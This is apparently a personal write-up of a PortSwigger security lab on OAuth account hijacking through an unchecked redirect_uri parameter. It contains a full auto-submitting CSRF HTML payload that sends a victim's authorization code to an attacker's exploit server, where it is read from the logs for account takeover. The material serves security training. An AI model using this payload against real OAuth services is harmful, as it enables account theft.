# [OAuth account hijacking via redirect-uri] — [PortSwigger] — [Practitioner]
**Date:** 2026-07-20
 
---
 
## Vulnerability / core concept
OAuth

---


## Payload / key command
This web application uses social profile to authenticate users. However, there is a serious flaw in its implementation. During authentication, OAuth server does not validate the `redirect_uri` parameter that lets attackers to steal authentication code of victim by sending the following CSRF request:
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://oauth-0afb009a03ca795980c65bd102fe00d0.oauth-server.net/auth">
      <input type="hidden" name="client&#95;id" value="dzy3kpdklwad7ltqsmzor" />
      <input type="hidden" name="redirect&#95;uri" value="https&#58;&#47;&#47;exploit&#45;0ab700af03ad7954801e5c9c011600e8&#46;exploit&#45;server&#46;net&#47;exploit" />
      <input type="hidden" name="response&#95;type" value="code" />
      <input type="hidden" name="scope" value="openid&#32;profile&#32;email" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
By checking the logs of our exploit server, we can retrieve the OAuth authentication code of the victim and perform account takeover.
